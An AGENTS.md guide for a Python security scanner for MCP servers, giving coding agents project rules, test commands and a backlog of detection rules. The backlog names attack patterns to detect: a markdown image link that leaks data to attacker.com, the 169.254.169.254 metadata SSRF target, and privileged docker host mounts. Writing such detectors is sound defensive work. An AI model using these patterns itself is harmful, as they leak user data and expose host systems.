# 🤖 AGENTS.md — Autonomous AI Coding Agent & Maintainer Guide

This file configures autonomous AI coding agents (**Google Jules**, **GitHub Copilot Workspace/Agent**, **CodeRabbit**, **Sweep**, and **OpenHands**) to proactively audit `MCP-Shield-`, generate Pull Requests, and prepare well-scoped tasks for human contributors.

## 🎯 Project Mission
`mcp-shield` is a zero-dependency Python 3.10+ security scanner, live prober, auto-fixer, and runtime stdio firewall for Model Context Protocol (MCP) servers and AI Agent skills.

## 🔒 Hard Invariants (Never Violate in Any Generated PR)
1. **Zero External Dependencies:** `pyproject.toml` MUST keep `dependencies = []`. Use only the Python 3.10+ standard library (`ast`, `json`, `re`, `hashlib`, `subprocess`, `urllib`, `math`, `base64`, `unittest`).
2. **AST Safety:** Never introduce `eval()`, `exec()`, `os.system()`, or `subprocess.Popen(..., shell=True)` inside `mcp_shield/`.
3. **Mandatory Unit Tests:** Every new detection rule or fixer rule MUST include a unit test in `tests/test_scanners.py`.

## 🛠️ Commands to Verify Before Opening a PR
```bash
python -m unittest discover -s tests -p "test_*.py" -v
python -m mcp_shield demo --html demo_scorecard.html --sarif demo_results.sarif
```

## 💡 Backlog of Autonomous PRs & Community Contributions to Generate
Autonomous agents scanning this repository are encouraged to open modular Pull Requests for:
- **New Secret Signatures (`SEC-009+`):** Hugging Face (`hf_...`), Stripe (`sk_live_...`), Supabase, and Groq API keys in `mcp_shield/scanners.py`.
- **Advanced Prompt Injection Rules (`TP-006+`):** Markdown image exfiltration (`![leak](https://attacker.com/?q=...)`) and SSRF local metadata targets (`169.254.169.254`).
- **Docker & Compose MCP Auditing (`SC-003+`):** Auditing `docker run --privileged` or host volume mounts (`-v /:/host`) in MCP server arguments.
